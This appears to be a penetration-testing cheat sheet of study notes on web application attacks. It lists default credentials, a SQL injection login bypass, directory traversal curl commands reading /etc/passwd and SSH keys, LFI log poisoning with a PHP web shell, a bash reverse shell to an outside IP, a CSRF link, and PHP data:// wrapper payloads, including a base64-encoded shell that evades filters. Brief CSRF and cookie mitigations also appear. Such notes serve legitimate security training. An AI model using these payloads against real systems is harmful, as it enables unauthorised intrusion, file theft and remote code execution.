

# Login form

```powershell

# Default creds
admin:admin
admin:password

# login forms - SQL injection
admin'# 

# Special characters:
< > ' " { } ;

# alert
<scirpt>alert(1337)</script>



```

# Directory Traversal


```powershell

# Obtain the contents of a file outside of the web server's web root

# ---------------------------------
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
curl --path-as http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# ------------ Files --------------- 
Windows:

	C:\inetpub\logs\LogFiles\W3SVC1\
	C:\inetpub\wwwroot\web.config

Linux: 

	/etc/passwd
	/home/offsec/.ssh/id_rsa
	
# ------------ xxxx ----------------

```

# Local File Inclusion (LFI)

```powershell
# LFI: allow us to "include" a file in the application's running code.

# Log poisoning: 

	# Step 1: Inject into browsable logs via user-agent: 
	 <?php echo system($_GET['cmd']); ?>
	 
	# Step 2: Access logs with cmd=ps command to check if it works. 
	../../../../../../../../../var/log/apache2/access.log&cmd=ps
	
	# Step 2a: if the command has a space, it needs url encoding:
	../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
	
	# bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
	# 
	
	
	
	
	../../../../../../../../windows/system32/drivers/etc/hosts
 
 
 

```

# CSRF

```powershell

CSRF:
# CSRF: Occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user. Example:
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
# if a user who's already logged in to the fakecryptobank clicks on this link, it might work if their session is active. 
# That's why it's advisable to not click on links you don't know. 
# AppSec remedy: 
	# 1. always double confirm important actions, so it requires multiple requests. 
	# 2. Generate pseudo-random nonce cookie per user.




URL vs HTML Encoding
# URL Encoding AKA. Percentage Encoding convert non-ASCII and reserved characters in URLs | E.g.: "%20"
# HTML encoding AKA. Character Encoding: converts HTML elements. For example, &lt; is the character reference for \<

Cookies:
# HttpOnly: Instructs the browser to deny JavaScript access to the cookie, protecting against XSS
# Secure:   Send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.



# 

```


# PHP Wrappers:

```powershell

# PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications. 

# php://filter:  can be used to include the contents of a file

	# 1. Let's say we suspect something is going on in a file and we want a close look:
		# We try to look into the file via php://filter but it retuns the same as normal:
		curl http://aSite.com/meteor/index.php?page=php://filter/resource=admin.php
		
		# 2. We can encode the output with base64: 
		curl http://aSite.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
		
		# 3. and decode it:
		echo "encoded" | base64 -d


# php://data can be used to achieve code execution

	# 1. Add data:// followed by the data type and content:
	curl "http://aSite.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
	
	# 2. If there's firewall in place filtering strings like "system"
		# First encode it:
		echo -n '<?php echo system($_GET["cmd"]);?>' | base64
		
		# Then use it: 
		curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
		
	
```


# Remote File Inclusion (RFI)

```powershell


```

